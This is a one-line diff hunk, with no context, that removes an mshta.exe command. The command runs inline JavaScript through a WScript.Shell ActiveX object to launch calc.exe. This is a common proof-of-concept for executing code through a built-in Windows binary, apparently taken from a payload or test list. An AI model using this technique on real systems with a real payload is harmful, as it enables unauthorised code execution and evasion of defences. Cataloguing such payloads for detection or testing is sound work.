@@ -1,1 +1,0 @@
-mshta.exe javascript:a=(new ActiveXObject('WScript.Shell')).Run('calc.exe');close();
